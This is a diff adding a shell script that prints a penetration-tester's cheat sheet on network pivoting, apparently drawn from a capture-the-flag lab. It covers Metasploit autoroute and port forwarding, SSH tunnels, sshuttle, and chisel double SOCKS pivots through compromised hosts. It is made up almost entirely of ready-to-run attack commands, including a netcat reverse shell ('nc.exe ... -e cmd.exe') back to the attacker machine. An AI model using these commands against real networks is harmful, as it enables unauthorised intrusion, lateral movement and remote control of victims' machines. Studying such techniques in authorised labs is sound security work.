@@ -1,0 +1,200 @@
+echo "#--------------------------------------------------------------------------------------"
+echo-e "\n# Network Pivoting\n"
+echo "#--------------------------------------------------------------------------------------" 
+
+cat <<eof
+## Metasploit Pivoting with ProxyChains
+
+### Within a Meterpreter Session
+run autoroute -s <subnet/subnet-mask>
+run autoroute -s 172.16.50.0/24
+
+0r
+
+### Outside A Metasploit Module
+route add 255.255.255.0/24 <session-number>
+route add 255.255.255.0/24 1
+
+### Setup Socks Proxy and Configure ProxyChains
+use auxiliary/server/socks_proxy
+0r
+use socks_proxy
+
+sudo nano /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+
+## Metasploit Port Forwarding
+### In Meterpreter
+portfwd add -l 2222 -p 22 -r $RHOST
+nmap 127.0.0.1 -p 2222
+
+0r
+
+portfwd add -L $LHOST -l 8080 -p 80 -r $RHOST
+nmap $LHOST -p 8080
+eof
+
+echo "--------------------------------------------------------------------------------------" 
+cat <<eof
+## SSH Pivoting
+
+### Local Port Forward
+
+ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
+ssh -L 8000:$INTERALHOST:80 $USER@$RHOST -fN
+
+nmap localhost -p 8000
+
+### Reverse Port Forward
+
+ssh -R 8000:172.16.0.10:80 user@172.16.0.5 -i ssh.key -fN
+ssh -R 8000:$INTERALHOST:80 $LUSER@$LHOST -fN
+
+nmap localhost -p 8000
+
+### Dynamic Socks Proxy and Proxychains
+#### Forward Socks Proxy
+
+ssh -D 1080 $USER@$RHOST
+ssh -D 1080 -i ssh.key $USER@$RHOST -N -f
+
+#### Reverse Socks Proxy (Only On Newer Versions Of SSH)
+
+ssh -R 1337 $LUSER@$LHOST -i ssh.key -fN
+ssh -R 1337 $LUSER@$LHOST -fN
+
+### Interactive SSH Prompt When Already In A SSH Session/Shell
+
+1. Adding -N -f flags will keep the ssh socket open without logging into a new SSH session
+	ps aux | grep ssh
+
+2. Interactive SSH Command Shell In Active SSH Sessions/Shells
+	~C
+	-L 5555:localhost:5555
+	-R 0.0.0.0:8445:localhost:8445
+
+	nmap localhost -p 5555
+
+3. More Than On SSH Pivot Method Can Be Done With One Command
+	ssh -R 172.17.0.1:8445:localhost:8445 -L 8001:localhost:8080
+eof
+
+echo -e "\n--------------------------------------------------------------------------------------" 
+cat <<eof
+## SSH-Shuttle
+
+sshuttle -r linux-admin@10.200.186.33 -x 10.200.186.33 10.200.186.0/24
+sshuttle -r $USER@$RHOST -x $RHOST $SUBNET
+
+sshuttle -r root@10.200.92.200 -x 10.200.92.200 -e "ssh -i id_rsa" 10.200.92.0/24
+sshuttle -r $USER@$RHOST -x $RHOST -e "ssh -i id_rsa" $SUBNET
+
+eof
+
+echo "--------------------------------------------------------------------------------------"
+cat <<eof
+## Chisel
+
+### Double Reverse Socks Proxy (Multi Pivoting)
+# chisel reverse socks proxy (chisel in a chisel "Wreath THM example") #
+https://wikihak.com/double-pivoting-with-chisel/
+# kali <-> public <-> first-internal-machine <-> second-internal-machine #
+
+# first pivot (kali/attacker <-> public-facing-machine)
+% setup socks5 server on kali/attacker machine
+kali
+	chisel server --socks5 -p 9001 --reverse
+
+% setup first client on pwned public facing machine ("kali server")
+public
+	./chisel client lhost:lport R:socks-port:socks &
+	./chisel client 10.50.93.12:9001 R:9999:socks &
+
+public
+% setup second chisle socks proxy server ("catch the first/next machines client")
+	./chisel server --socks5 -p 9002 --reverse &
+
+__________________________________________________
+# second pivot (public-machine <-> first-machine)
+% setup final client for the public machine's chisel server
+first-machine
+        ./chisel client public-ip:public-port R:socks-port:socks
+        ./chisel client 10.200.92.200:9002 R:8888:socks
+
+if windows machine
+        chisel_1.7.3_windows_amd64 client 10.200.92.200:9002 R:8888:socks
+        cmd.exe /c "chisel.exe client 10.200.92.200:9002 R:8888:socks"
+
+# add everything to proxychains and pivot
+socks5 127.0.0.1 9999
+socks5 127.0.0.1 8888
+        proxychians nmap <second-machine>
+0r      proxychains ping -c4 10.200.92.100
+
+_________________________________________________________________________________________________
+### Double Forward Socks Proxy (Multi Pivoting)
+# setup
+kali <-> linux-webserver <-> windows-host <-> internal-windows
+10.50.90.158 <-> 10.200.89.200 <-> 10.200.89.150 <-> 10.200.89.100
+
+# first forward socks proxy
+kali <-> linux-webserver <-> windows-host
+
+	./chisel_1.7.3_linux_amd64 server -p 1180 --socks5 (linux-webserver)
+	chisel client 10.200.89.200:1180 1080:socks (kali)
+
+% proxychains at this point
+	socks5 127.0.0.1 1080
+
+------------------------------------
+# second chisel forward socks proxy
+linux-webserver <-> windows-host <-> internal-windows-host
+
+./chisel.exe server -p 1181 --socks5 (windows-host)
+./chisel_1.7.3_linux_amd64  client 10.200.89.150:1181 1081:socks (linux-webserver)
+
+% proxychains at this point
+	socks5 127.0.0.1 1080
+	socks5 127.0.0.1 1081
+
+{!} check;
+	proxychains nmap -Pn -p 80,3389 10.200.89.100 -v
+
+{$} able to catch reverse shells over duel pivot very well
+	nc -vlnp 8900
+	nc.exe 10.50.90.158 8900 -e cmd.exe
+
+--------------------------------------------------------------------------------------
+### Chisel With Mallet ("Makes Chisel Act Like <sshuttle>")
+#### Chisel and Mallet Forward Proxy Example
+
+<kali> <-> <linux-web-server> <-> <internal-windows-box>
+
+(Run on <linux-web-server>)
+./chisel server -p 6900
+
+(Run on <kali-0r-lhost>)
+sudo mallet start --chisel-server <pivot-host>:<server-port-number> <subnet/submask-number>
+
+sudo mallet start --chisel-server 10.200.92.200:6900 10.200.92.0/24
+sudo ./mallet start --chisel-server 10.200.89.200:6900 10.200.89.0/24
+
+sudo mallet start --chisel-server $RHOST:6900 $SUBNET
+
+(!) NOTE
+1. not stable for port scanning
+2. better used to view webpages // use tools without proxychains
+eof
+echo -e "\n--------------------------------------------------------------------------------------" 
+cat <<eof
+## Useful Online Pivoting Resources List
+
+https://pentest.blog/explore-hidden-networks-with-double-pivoting/
+https://wikihak.com/double-pivoting-with-chisel/
+
+https://github.com/ryotarai/mallet
+https://github.com/jpillora/chisel
+eof
+echo -e "\n--------------------------------------------------------------------------------------"
+
+
